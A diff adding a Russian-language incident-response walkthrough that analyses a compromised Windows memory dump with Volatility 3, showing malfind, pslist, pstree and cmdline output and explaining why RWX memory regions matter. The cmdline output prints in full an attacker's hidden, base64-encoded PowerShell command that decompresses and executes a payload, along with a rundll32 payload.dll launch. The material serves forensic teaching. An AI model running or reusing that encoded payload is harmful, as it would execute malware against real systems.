@@ -1,0 +1,1025 @@
+Данный обзор демонстрирует коплексный анализ скопрометнированной системы (на основе Windows)
+В связи с этим будут будут разобраны различные методы и утилиты 
+А именно: 
+
+    -   Memory Analysis 
+
+            Volatility
+                *   Identifying the Memory Dump's Profile
+                *   Identifying Injected Code
+                *   Identifying Running Processes
+                *   Identifying Process Command Lines
+                *   Dumping Process Memory & Leveraging YARA
+                *   Identifying Loaded DLLs
+                *   Identifying Handles
+                *   Identifying Network Artifacts 
+
+    -   Rapid Triage Data Examination & Analysis 
+
+            Disk Image with AUTOPSY
+                *   Searching for Keywords
+                *   Identifying Web Download Information & Extracting Files
+                *   Extracting Cobalt Strike Beacon Configuration using Python script
+                *   Identifying Persistence with Autoruns
+                *   Analyzing MFT Data
+                *   Analyzing SRUM Data 
+
+            Windows Event Logs using CHAINSAW 
+
+            Prefetch Files (PECmd) 
+
+            USN Journal using Python script (usn.py) 
+
+Так как доступ к скомпроментированной системе платный, то чтобы каждый раз не изменять расположение того илииного файла/утилиты, я оставлю их как есть 
+
+    -   Расположение дампа памяти 
+        C:\Users\johndoe\Desktop\memdump\PhysicalMemory.raw 
+
+    -   Расположение артефактов быстрой сортировки 
+        C:\Users\johndoe\Desktop\kapefilesC:\Users\johndoe\Desktop\files 
+
+    -   Расположение полного образа диска 
+        C:\Users\johndoe\Desktop\fulldisk.raw.001 
+
+    -   Расположение проанализированных данных полного образа диска 
+        C:\Users\johndoe\Desktop\MalwareAttack 
+
+*** В ходе расследования необходимо исследовать артефакты или улики в специализированной системе, предназначенной для криминалистических задач. 
+    Однако в целях целесообразности анализ проводится в самой затронутой системе. 
+
+Итак начнем..... 
+*** Хочу, сразу сказать, что не всегда нужно использовать PSИногда можно и обычную командную строку 
+    Но, в целя демнострации я продпочитаю все делать в одной "среде" 
+
+===================================================================== 
+* Memory Analysis *
+*******************
+
+    +++++++++++++++++ 
+    + Volatility v3 +
+    +++++++++++++++++ 
+
+        ///////////////////////////////////////////// 
+        /// Identifying the Memory Dump's Profile ///
+        /////////////////////////////////////////////
+
+        Начнем с получения сведений об ОС и ядре анализируемого образца памяти Windows, используя плагин    -   windows.info
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
+
+            Variable                        Value
+
+            Kernel Base                     0xf80150019000
+            DTB                             0x1ad000
+            Symbols                         file:///C:/Users/johndoe/Desktop/volatility3develop/volatility3/symbols/windows/ntkrnlmp.pdb/89284D0CA6ACC8274B9A44BD5AF9290B-1.json.xz
+            Is64Bit                         True
+            IsPAE                           False
+            layer_name                      0 WindowsIntel32e
+            memory_layer                    1 FileLayer
+            KdVersionBlock                  0xf80150c283a0
+            Major/Minor                     15.19041
+            MachineType                     34404
+            KeNumberProcessors              2
+            SystemTime                      2023-08-10 09:35:40
+            NtSystemRoot                    C:\Windows
+            NtProductType                   NtProductWinNt
+            NtMajorVersion                  10
+            NtMinorVersion                  0
+            PE MajorOperatingSystemVersion  10
+            PE MinorOperatingSystemVersion  0
+            PE Machine                      34404
+            PE TimeDateStamp                Fri May 20 08:24:42 2101
+
+        /////////////////////////////////
+        /// Identifying Injected Code ///
+        /////////////////////////////////
+
+        Для выявления диапазонов памяти процесса, которые потенциально могут содержать внедренный вредоносный код, можно использовать плагин -windows.malfind
+        *** Так как вывод может быть весьма внушительным, то я продемоснтрирую только основные моменты
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.malfind
+
+            Volatility 3 Framework 2.5.0
+
+            PID     Process             Start VPN       End VPN         Tag     Protection                  CommitCharge    PrivateMemory File output       HexdumpDisasm
+
+            3648    rundll32.exe        0x1f2d8c20000   0x1f2d8c6dfff   VadS    PAGE_EXECUTE_READWRITE      78              1                               Disabled
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            ...SNIP...
+            0x1f2d8c2003a: add byte ptr [rax], al
+            0x1f2d8c2003c: add byte ptr [rax], al
+            0x1f2d8c2003e: add byte ptr [rax], al
+            
+            6744    powershell.exe      0x1db40f50000   0x1db40f9dfff   VadS    PAGE_EXECUTE_READWRITE      78              1                               Disabled
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            00 00 00 00 00 00 00 00 ........
+            ...SNIP...
+            0x1db40f5003c: add byte ptr [rax], al
+            0x1db40f5003e: add byte ptr [rax], al
+            
+            5468    rundll32.exe        0x13c60d40000   0x13c60d8dfff   VadS    PAGE_EXECUTE_READWRITE      78              1                               Disabled
+            00 00 00 00 00 00 00 00 ........ 
+            00 00 00 00 00 00 00 00 ........ 
+            00 00 00 00 00 00 00 00 ........ 
+            00 00 00 00 00 00 00 00 ........ 
+            ...SNIP 
+            0x13c60d40038: add byte ptr [rax], al
+            0x13c60d4003a: add byte ptr [rax], al
+            0x13c60d4003c: add byte ptr [rax], al
+            0x13c60d4003e: add byte ptr [rax], al
+
+Когда процесс выделяет страницу памяти с разрешениями PAGE_EXECUTE_READWRITE, он по сути запрашивает возможность как выполнять, так и записывать в эту область памяти.
+Проще говоря, процесс говорит: «Я хочу иметь возможность запускать код отсюда, но я также хочу иметь возможность изменять то, что находится в этом коде на лету».
+
+Почему это должно привлечь наше внимание?
+Ну, легитимные приложения обычно разделяют задачи выполнения кода и записи данных.
+У них будут определенные области памяти для запуска кода (исполняемого) и отдельные области, где данные записываются или изменяются.
+Это разделение является фундаментальным принципом безопасности, гарантируя, что данные не будут непреднамеренно выполнены или что исполняемые области не будут неожиданно изменены.
+
+Однако многим типам вредоносных программ, особенно тем, которые используют методы внедрения кода, требуется возможность записывать свою полезную нагрузку в память, а затем выполнять ее.
+Выделяя память с разрешениями PAGE_EXECUTE_READWRITE, они могут записывать и впоследствии выполнять вредоносный код в той же области памяти, что делает их вредоносные действия более упорядоченными и эффективными.
+По сути, хотя не каждый экземпляр PAGE_EXECUTE_READWRITE является вредоносным, его наличие является сильным индикатором потенциального неправомерного действия, и это то, за чем мы, как бдительные аналитики безопасности, должны внимательно следить.
+
+        /////////////////////////////////////
+        /// Identifying Running Processes ///
+        /////////////////////////////////////
+
+        Давайте теперь перечислим процессы, присутствующие в этом конкретном образе памяти Windows, с помощьюплагина -windows.pslist
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.pslist
+
+            Volatility 3 Framework 2.5.0
+
+            PID     PPID    ImageFileName           Offset(V)           Threads     Handles     SessionId   Wow64   CreateTime                      ExitTime File                   output 
+
+            4       0       System                  0x800adb87e040      161         -           N/A         False   2023-08-10 00:22:53.000000      N/A                             Disabled 
+            92      4       Registry                0x800adb8ee080      4           -           N/A         False   2023-08-10 00:22:48.000000      N/A                             Disabled 
+            304     4       smss.exe                0x800ade54f040      2           -           N/A         False   2023-08-10 00:22:53.000000      N/A                             Disabled 
+            416     404     csrss.exe               0x800adf452140      10          -           0           False   2023-08-10 00:22:55.000000      N/A                             Disabled 
+            ...SNIP... 
+            772     588     fontdrvhost.exe         0x800adff45140      5           -           1           False   2023-08-10 00:22:56.000000      N/A                             Disabled 
+            884     632     svchost.exe             0x800adff8c2c0      8           -           0           False   2023-08-10 00:22:56.000000      N/A                             Disabled 
+            972     588     dwm.exe                 0x800ae0021080      15          -           1           False   2023-08-10 00:22:56.000000      N/A                             Disabled 
+            ...SNIP     
+            2244    632     vm3dservice.exe         0x800ae0729240      2           -           0           False   2023-08-10 00:22:57.000000      N/A                             Disabled 
+            2252    632     VGAuthService.exe       0x800adf464300      2           -           0           False   2023-08-10 00:22:57.000000      N/A                             Disabled 
+            2276    632     MsMpEng.exe             0x800adf466280      0           -           0           False   2023-08-10 00:22:57.000000      2023-08-10 00:31:58.000000      Disabled 
+            2284    632     vmtoolsd.exe            0x800adf4620c0      12          -           0           False   2023-08-10 00:22:57.000000      N/A                             Disabled 
+            2380    440     taskhostw.exe           0x800ae07ea280      0           -           1           False   2023-08-10 00:22:57.000000      2023-08-10 00:23:00.000000      Disabled 
+            2840    876     ctfmon.exe              0x800ae0584080      8           -           1           False   2023-08-10 00:22:58.000000      N/A                             Disabled 
+            640     632     dllhost.exe             0x800ae0a1f280      10          -           0           False   2023-08-10 00:22:59.000000      N/A                             Disabled 
+            3128    760     WmiPrvSE.exe            0x800ae0ab8280      13          -           0           False   2023-08-10 00:23:00.000000      N/A                             Disabled 
+            3240    632     msdtc.exe               0x800ae0af9280      9           -           0           False   2023-08-10 00:23:00.000000      N/A                             Disabled 
+            3508    588     userinit.exe            0x800ae0b75300      0           -           1           False   2023-08-10 00:23:00.000000      2023-08-10 00:23:24.000000      Disabled 
+            4400    632     SearchIndexer.exe       0x800ae0fcb240      16          -           0           False   2023-08-10 00:23:04.000000      N/A                             Disabled 
+            4724    760     RuntimeBroker.exe       0x800ae0e27080      3           -           1           False   2023-08-10 00:23:04.000000      N/A                             Disabled 
+            ...SNIP... 
+            2868    760     SkypeBackgroun.exe      0x800ae2961080      4           -           1           False   2023-08-10 09:10:28.000000      N/A                             Disabled 
+            7820    632     Velociraptor.exe        0x800ae0b5e080      15          -           0           False   2023-08-10 09:11:16.000000      N/A                             Disabled 
+            6388    148     chrome.exe              0x800ae1389080      0           -           1           False   2023-08-10 09:11:41.000000      2023-08-10 09:15:24.000000      Disabled 
+            3648    7148    rundll32.exe            0x800ae16c6080      4           -           1           False   2023-08-10 09:15:14.000000      N/A                             Disabled 
+            6744    908     powershell.exe          0x800ae5da50c0      10          -           1           False   2023-08-10 09:21:16.000000      N/A                             Disabled 
+            5692    6744    conhost.exe             0x800ae19e4300      3           -           1           False   2023-08-10 09:21:16.000000      N/A                             Disabled 
+            ...SNIP... 
+
+        Если мы хотим составить список процессов в дереве на основе идентификатора их родительского процесса, мыможем сделать это с помощью плагина -windows.pstree
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.pstree
+
+            Volatility 3 Framework 2.5.0
+            PID         PPID    ImageFileName           Offset(V)           Threads     Handles     SessionId   Wow64   CreateTime                      ExitTime 
+
+            4           0       System                  0x800adb87e040      161         -           N/A         False   2023-08-10 00:22:53.000000      N/A
+            * 304       4       smss.exe                0x800ade54f040      2           -           N/A         False   2023-08-10 00:22:53.000000      N/A
+            * 1428      4       MemCompression.exe      0x800adb9a0040      42          -           N/A         False   2023-08-10 00:22:56.000000      N/A
+            ...SNIP... 
+            ** 640      632     dllhost.exe             0x800ae0a1f280      10          -           0           False   2023-08-10 00:22:59.000000      N/A
+            ** 1676     632     svchost.exe             0x800ae030d2c0      3           -           0           False   2023-08-10 00:22:57.000000      N/A
+            ** 7820     632     Velociraptor.exe        0x800ae0b5e080      15          -           0           False   2023-08-10 09:11:16.000000      N/A
+            *** 4040    7820    winpmem_mini_x.exe      0x800ae1fe8080      3           -           0           False   2023-08-10 09:35:40.000000      N/A
+            **** 5112   4040    conhost.exe             0x800ae1334080      6           -           0           False   2023-08-10 09:35:40.000000      N/A
+
+            ...SNIP... 
+            *** 2080    440     sihost.exe              0x800ae04ba080      8           -           1           False   2023-08-10 00:22:57.000000      N/A
+            *** 2404    440     taskhostw.exe           0x800ae07f22c0      8           -           1           False   2023-08-10 00:22:57.000000      N/A
+            *** 3372    440     powershell.exe          0x800ae1fe1080      8           -           0           False   2023-08-10 00:30:32.000000      N/A
+            **** 3136   3372    conhost.exe             0x800ae25e3300      4           -           0           False   2023-08-10 00:30:32.000000      N/A
+            **** 6564   3372    Autorunsc64.exe         0x800ae2ddf080      1           -           0           False   2023-08-10 00:30:40.000000      N/A
+            ...SNIP... 
+            ** 2276     632     MsMpEng.exe             0x800adf466280      0           -           0           False   2023-08-10 00:22:57.000000      2023-08-10 00:31:58.000000 
+            ** 1380     632     Sysmon64.exe            0x800ae1b74080      12          -           0           False   2023-08-10 00:30:58.000000      N/A
+            ** 3964     632     SecurityHealth.exe      0x800ae1489280      9           -           0           False   2023-08-10 00:23:17.000000      N/A
+            ...SNIP... 
+            *** 3052    892     chrome.exe              0x800ae2847080      9           -           1           False   2023-08-10 09:32:32.000000      N/A
+            * 3508      588     userinit.exe            0x800ae0b75300      0           -           1           False   2023-08-10 00:23:00.000000      2023-08-10 00:23:24.000000 
+            * 972       588     dwm.exe                 0x800ae0021080      15          -           1           False   2023-08-10 00:22:56.000000      N/A
+            ...SNIP... 
+
+        /////////////////////////////////////////
+        /// Identifying Process Command Lines ///
+        ///////////////////////////////////////// 
+
+        Чтобы определить список аргументов командной строки процесса можно использовать следующий плагин    -   windows.cmdline 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.cmdline 
+
+            Volatility 3 Framework 2.5.0 
+
+            PID     Process             Args 
+
+            4       System              Required memory at 0x20 is inaccessible (swapped)
+            92      Registry            Required memory at 0x20 is not valid (process exited?)
+            304     smss.exe            Required memory at 0xb439a5b020 is not valid (process exited?)
+            416     csrss.exe           %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4ProfileControl=Off MaxRequestThreads=16492 wininit.exe Required memory at 0xf32bb96020 is inaccessible (swapped)
+            500     csrss.exe           %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4ProfileControl=Off MaxRequestThreads=16588 winlogon.exe winlogon.exe
+            ...SNIP... 
+            972     dwm.exe             Required memory at 0x16b5215ff is not valid (process exited?)
+            ...SNIP... 
+            1428    MemCompression.exe  Required memory at 0x20 is not valid (process exited?)
+            ...SNIP... 
+            1872    svchost.exe         Required memory at 0x6500bf600098 is not valid (process exited?)
+            ...SNIP... 
+            2380    taskhostw.exe       Required memory at 0x1afc45f020 is not valid (process exited?)
+            2404    taskhostw.exe       taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+            2520    vm3dservice.exe     Process 2520: Required memory at 0xfdac105020 is not valid (incomplete layer memory_layer?)
+            2840    ctfmon.exe          Process 2840: Required memory at 0x1935cea020 is not valid (incomplete layer memory_layer?)
+            ...SNIP... 
+            3508    userinit.exe        Required memory at 0xd59bec7020 is not valid (process exited?)
+            ...SNIP... 
+            5912    RuntimeBroker.exe   C:\Windows\System32\RuntimeBroker.exe -Embedding1996 svchost.exe C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+            ...SNIP... 
+            7032    RuntimeBroker.exe   C:\Windows\System32\RuntimeBroker.exe -Embedding
+            ...SNIP... 
+            7316    StartMenuExper.exe  "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca4640 TextInputHost. "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca
+            ...SNIP... 
+            7820    Velociraptor.exe    "C:\Program Files\Velociraptor\Velociraptor.exe" --config "C:\ProgramFiles\Velociraptor\/client.config.yaml" service run6388 chrome.exe Required memory at 0x315417b020 is not valid (process exited?)
+            3648    rundll32.exe        "C:\Windows\System32\rundll32.exe" payload.dll,StartW
+            6744 powershell.exe "PowerShell.exe" -nop -w hidden -encodedcommandJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADIAZwBKAFUAQgBNAEcAYgBDAEQATgBHADcAWAAwAEQATQBiAHMAUwB5AEEAcwBkAGwANABVAGwAYwB1AEYASwBlAEsAMQBYAEEAYgBEAG0ALwBmAGYANQA1AGEAQgBkAEgAbwA2AFAAZABQAFMAegBFAFMASwBxAEgATABkADUAZABTADUAUwA5ADAANQA0AFgAZAB6AHoAaQBqAG0AbwA4AEEAbQAwAHQAMgBTAHMASgBnAEcAdgBpAFQAZgAzAG0ANABTAEgAMwBPAHgARgBvAHMAWABoAC8AQwBYAGsAQQBYADQAQgBkAGsAMgBJADMARQBzAC8AWABsADcATQAwAFUATQBlAFYATAArADAAeAA2AHgARgB5ACsAdwBFADUAYwBVAHAAVwB3AGoAQgBJAG0AZABNAEYASwA0AHUAYgBtADkAeQBUADQAbABmAG8AdwAyADUATQBWAEgAbgBPADcASgBpADAAZgA0AE4AcgBCAGoANgBhAHUAVQBmADEATABEAFUAQQBzADgAUgBQADMAbgAzADMANQByAEoAWQB3AFIAbgA1AC8AMwBwAFEANwBoAGEAaAB3AFQAegAzAEkAcABpAGYATQBGADYAUgAvAFMAYQBrAHMAWQB1AFoAdABZAE8ANABLADUAOQBLAGYAMAA2AGEAWABVAGMAUQBNAEwAdQBSAGUAeABZAHcAdgBoAEwAZAB4AEMAOQBXADEAeABOAGcAdwB3AEUAagBjAG8AegBVAE8AWAA4AG4AegB1AGoAegA5AHkAaABhAGUANwB5AG4ATwBwAEgAUwBYAEkAagBmAE8ANQArAFQASABtAHgAQwB2AFoAcgBwAHMAcgBTAEgAOABWAGgATQBQAEgAWQAwAGoAeQB1AFIASABGAEwASQBpAEQARABTACsAdABxAEsALwBJAHAAVQBXAEcAZgBwAHkAQgBIADUAMgB4ADUAdwBxAFgAbQB6AGsAaABnAG4AdgA4AC8ASgBMAEMANgBsAGsAbgBuADQAUABsAEYATABoAFIAegB4AHoAbQBpAHQASwBUADgAUABmADAALwBDAHoAOQAvAG8AWgBtAGwAdgBpAGMAZQBxAFQAVQA4AHoAbABoAFEAVABnAG4AYgBFADgAeABpAFUAdABkADUATgBzAHUAbQBaAEUATgBxAE8AVgBpAGkASgBuAHYANQBBAG8AQQBnAGgARwBlAE0ARgArADYAWQBnAEcAOQBmAGYAQgBLADgAcAAvADgAeABIAFcATABZAFAAZgBwAFYAKwAwACsANQA4AGYAawBjAEMAWAAzAFYANQBYAHkANwA1AFYAQQBhAHMAcABaAG8AWABqAEoAaQBWACsAaABZADUAVABsAHoAZABrAGMAWABPAGMASAA5AE8AKwBTAHEAdwBCAC8AUAB5AFIAWQA0AGYAYQB2AGoAMQBMAFYASgBpADUAeABFAEMAYwB2AEgAUABoADkAbAA2AHUAMwBOAHoAZABQADIAWgBMAEEAZgBmAEwAVABJAEsAYQBaADMAbABlAHAAWABKAFIARwBBAEEATAB4AGcAQgAxAEYATwBCADkAWgBRAGcAcgBQADMAKwBKAHoAZABuAHYAVgBqAEkAcwAvAE4AVgBTADUAYQBsADEAMAB6AHUARQA1ADQALwBnAHEAUABTADAARABhAGoALwBmADMAaABSAHUATAA5AGsAagB2AHIAOQBZAEMAWABWAHQAdwBzAFQANQB6ADYAdABCAEkAeAB2AHEARQArADMAbwBJADQALwBpAGEAOABMAG4AUAA0AG8AWgAyAGIAZwBrADQANgBOADAARgBSAHMARAB6AG4AegB1AGMAawBCAHMANwBjAEoATwBUAGgARAA2ADkASwBOAGEAMgA2AFAAOABUAGIAZAA1AEIAcQBkAGkAaQBIAHMATQBxAEMAQQBsAEMAdAArAEQATwBjAGMAdwBuACsAdgA1AEkAKwBJAEIAZgArAGMAOQBwAE8AbQBuAEQAWgBRAFoAdQBVAHAAZgBTAHUAdAA0ADkAUwA3ADIASQBwAGQAYgBMAG8AcgBqAG8AagBSAE4AbwBNADUAeABVAFoAbwBUADUAQgBLADcASwBLAGwAKwBUAEMAOQBIAGEAcwBLAEQAYgBKAG4ANwBCAG4AZQBVAHUASgB4AGkARgBQAE8AcgB1AGUAZgBDAEIANQBSAGUAWABMAGMAQwBIAHkAbwBtAHcAUgBCAGQAbwBPAEYAeABIAGgASgBNAGsAUwB0AFkASwBVAHAAZABhAHAAUABtAGMAVQA2AGQASwA0AFQAYwBoADUAeQAwAGsATwB0AEMAeQBZAEcAbABQAGMAUQBFAHYAZwBnAHUANQBsAHoAawBEAEwATwBMAC8ANQBvAGYAaABkAEsAYwA4AEoANABYAHUAcwBRAEQANgBhAHcATAA2AFMANQB5AG8ATwBkAGMASwBpAHAATABOACsAUQBRAE8ALwBkAHYAWQBGAC8AcgA1AEYAdwBVAGcAcQBzAHIAUwBlADkAQQBRAHcATABNADMAWQBBAFgAcABTAFYAbABIAFAAcABhAHIAdgBoAEQANAB2ADEAMwA4AEwANQB2AE0AZAAvAEIAYgBEAEYAeQBDAFcAUQArAEsAOABUAGUAQgBoAHIANgB1AFEAcwBBAE8AegBFADkAUQBUAE0AbQBrAGYAUwBsAEkARQByAHcAcQBYAG4AawBvAHAAWQB5AE0AMQBnADgATgAxAC8AZgBpAE0ANQBvAFoAUgB5AFUAZABCAFoANABUAFIAUwBUAGUAbgBXAGUAOQBiAGgAOABUAHAARQBUAEoAMgAxAE0AaAAvAFgAagBhAE4AZQBUACsAMABmAEQASAA2AGYAWQBYADcATAAyAFgAdQArAGcAKwBqAFoAOQBrAEoATQBBAFAAMwBJAFcAZABkAHMAYQA3AEcAZABZAGoAbQBPADMANAA0AGIAVwBkAGgAaQBoAGQATABqAGIAcABZADMAVwArAHQAaQBlAHEAdgBLAFEAMQBtAG0ATgA5AHAASgBoADgAKwBUAHIARgBIAHUAZwA5AHoAQQBKAGoARgBtAEQAOQBmAFoAagBQAFgARABqACsAMABGAEwAWAB5ADAAUQAzAFUAVwBaAHIAOABTAHIAVgB1AHcAMgBPAGcANQBQAHUATAA1AGwARQA1AGsARQB4AG0ARQBjADkAZgBaAFQAMQBWADcAdABjAGQAMABiAEIASABxAGQAZwArADQAeQBhAFMAYwBoAGEAeQBlAFQAcQBaAEUATQBvADYASABYAG8AOQBYAHQAWABsAHYAeQAvAHIANwBYACsAZABJAGQAeQBBAGIANgA0AGwAcgAzAEoATgBPADMASQArAEgATABpAEoAdwA5AEUAdgB0AFQAUQArAHgAcAAxAEMASgBNACsARABHAEEAZgBhAEoAVQA2AG0AVABWAHYAegBmADgAawBKAEoAVgA0AHAAdwBPAFkANAByAHQAawAwAGIAawBQAG4AeABQAGcAaABFAE8AWQAyAFYAOAB3AHAAdgBYADEAeAAwAEsASwA0AHYANQBhADIAWAB3AHUARABEAFgAdwBFADAARgBSAFUAeQAzADYAbQB4AHUAaABPADUAKwBxAFMANQBlAGwAYQBuAEoATQBtAHgANwBIAFQAQwBPAEIAVQA2AEsANQBmADcASgBDAEYAOQBOAGUAeABtADEAbABhAG4AVgBXADMAUgBkAEYAaQBWADkANgBpAGwAdwA1ACsATgBGAHgAdQBzAGYANQAvAE0AbQAvAEEANQBNAGUAeABCADkAcQBkAGsAbgArAGQAZwBOAHEANgBqAE8ASwBIAEMAYQBnAHAAOQA3AHcAUwA5AGUAeABMAHYAZQBhAHUATABqAHQAVQA0ADkAdgBKAFcAMQAyAFEANAAzAHYAQwBTAHEAQQBlADUAcQBkADkAdwBmAHIARgBNAFcAOABUADYATAA5AG0ANQBVAG0AMAB5AHgAdwBKADMAcABDAGYAbQBIAHEAagB1AHAAZwBIAHgAawA3AFkAWQBEADkATABsAEgAUgB6AHYAVQBPAE0AWABEAEEAZABtAEwAOQBYAEcAcQBEAGQASgBqAGIAOQBmADcAawBqAFMARgBuAHQAWQB4AGoANQBZAGUANwAzAFQAdgAwAE0ASQBIAGMAdwBkADUAVQBOAFcAVgB4AG8AbQBzADQANQBWACsANABLAGYATgBRADcAQQB3AE8AdQBwAEEAMQA2AHQAZAAwAHcAcwBkAHcAMgA5AFAAYwBOAGUAbQAxAHMAcQBtAGUASQBVAG4AaABsAGQAUgBrAEwAOABFADMAKwBaAEIAOAAyADAAUABkAC8ASABFAFgASQBWADcAMAArAGwAMQAwAFcASABMAFcAdgBQAFIAeQBsAEwANwBwAHkAWQBkAHkANAB1ADIATwBkAE8AOABmAG4AdgAyAFcAbABsADMASABzAGIASgBvACsANABPAEgAcwB1AE4AbAB0AFkAMAB4AHUAMwBEAGEAUABqAFEAVABpAGUATABjAG4AOAA5AGYAOQBXAG4AcwA2ADIAagBXAFgANAB6AE0AcAAwAFIAMABtAFkAagBRADEAVgBtAEUAQQA5ADcAdABOAFIAVgB6AFYAcABqAFQAWAA4AG8AegB6AHYAcQBXAEYAawBzAHcAcQA2AHcAbAA5AGwASQBIAGMAMQBZAHAAWgBHADUARABRAHoAVABxADgAaQA0AFUAegBzAFkAbgBUAFIAcAAwAFcAcgBZAFMAOAAxAFkAOQBVAGMAZABBACsASgBFAG0AdgBiAGYAcwBPAEwAZQA2ADEAcwA4AHgARQBwADUAbwBIAGUAYQBUAG0AcwA3AEkAMAAzAFoAagBJAHgATwBQADkAWAA4AHAAZwBMADMAOABnADEAZgA5AHcARQB2AHQAKwBXAHcAZwBuAHgAZAB4AG0AcABOAE0AZQBGAE0AOAA1AGEAUgBKAFIAdQB0AHAAaAB6ADMAMABPAEgAMQAvADgAKwBkAEIANwBtAHEATwBPAHUATgBNAHEANgBSADEARgBpADMAbABIAEUARAA4AEQAcQBHAEcAaQB6AFcAagB1ADAAaABEADMATABxAG8AWABhAHcANQBUADQAMwA1AFgANQBxAEgAbQByAFUAVwB0AHUAUgB2AFEAcABUADIAMQBjAG4AdABtAHcAZQA3AEUAUABOAFIAVgA3AEQAVQB4ADIAYgB0AFQAcAB4AC8AOABMAEgAegBnAGkAVgBSAHoAZgBRAEsAKwBlAGMAagBrAHoASQBWAGEAagBSAGcAZABVADcAaQBWAG8AZABJAEMATwByADIAWQBGAEoAcQB2AFkAaAA1AFMAYwBaADMAVABjAFAAdQBKAE4ARQBLAGYAeQBYAEkAUwBjAC8AcgAwAEQAMgBJAEcAUwBpAFMASQBhADgASABsAG0AcgA2AEEAQgA1AGoAZQBxAGEAcgA5AGEAdAAzAGIASwAyADEASwBQAFcAagBQAFcAUwBGAHQAUwA5AFYAUwBZAEsAdgAwAGQASABBADIAcABpAHQATQBPAGYAdABlAEYAKwBmAEkAKwBWAGQAcQBPAHoAcgBEAFQAYgBqADIAMgArAGUAbAB6AGkAOABhAEkAZAByAG0AZAAwAGwATQBsAGsAcgBYAEkAVABNAEoAaAArAFUAagBGAFIALwBGADIAQwAzAHoAdQBYAFMAMgA4AE4ARAA5AG8AYwB0AEYAZgB4AC8AZgBQAG4AcgBDAFgAZQB2AEIAMAA5AGYAVQBxAGYAcgAyAFAAawAyAC8ANwBPAFMAcwBHAGMAVQByAHUAOQArAGUAcwA2AEwAKwB6AFIAdQA2ADcANQBzACsAbABzAGgARgBpADgAUgBTADUAMABVADUAaQB3AHIAdQArAGoASABqAEQAOQBNAGkAZABOAEEAeQBvADAAOAB2AG0AUABSAC8AdABYAHcAbgB6AGkAdwB0AGcATABnAC8ASAAxAFYAVgBGAGQATgA4AEIAaQBzAHYAdgBKAGkAUABYADcAVwA5ACsASAAxADMATQBCAFMAMABYACsAYwBGAFgANAA5AGsAQQBVAEMAdABlAG4AegAwAG8AMgBtADIAegA4AHUAVgB6AHgATwBnAFYAKwBlADAAcABNAHUARgAvAHgASABaAEYARAA0AGoAdAA4AFcANQBUAEsAcQBWAEkAdQBsADgAVgB2AHQAUQB6AFcAZgBwADIAWQBWAGgAQQBlADgAMgAvADIAaQBtAEwAKwBlAHcAZgBsAHYAUwBzADMAYwAvAFUAMgBzAEwASABFADkAOABqAC8ATQBBAGIAZgBlAGYAMwBQADcAQQByACsAcwBoAG4AeQBHADMAcwBaAG8AbwA4AHAARQA0AC8AeQBQAHcASAA0AGIAWQB6AFoANAB3ADAAQQBBAEEAPQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA5692 conhost.exe Required memory at 0xf3f686e020 is inaccessible (swapped)
+            ...SNIP... 
+            7292    svchost.exe         C:\Windows\System32\svchost.exe -k swprv...SNIP... 
+            4492    chrome.exe          "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=crashpad-handler "--user-datadir=C:\Users\johndoe\AppData\Local\Google\Chrome\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler"--database=C:\Users\johndoe\AppData\Local\Google\Chrome\User Data\Crashpad" --url=https://clients2.google.com/cr/report -annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=115.0.5790.171 --initial-clientdata=0x19c,0x1a0,0x1a4,0x178,0x1a8,0x7ffa8aede9e0,0x7ffa8aede9f0,0x7ffa8aedea007208 chrome.exe Required memory at 0x4a793ec020 is inaccessible (swapped)
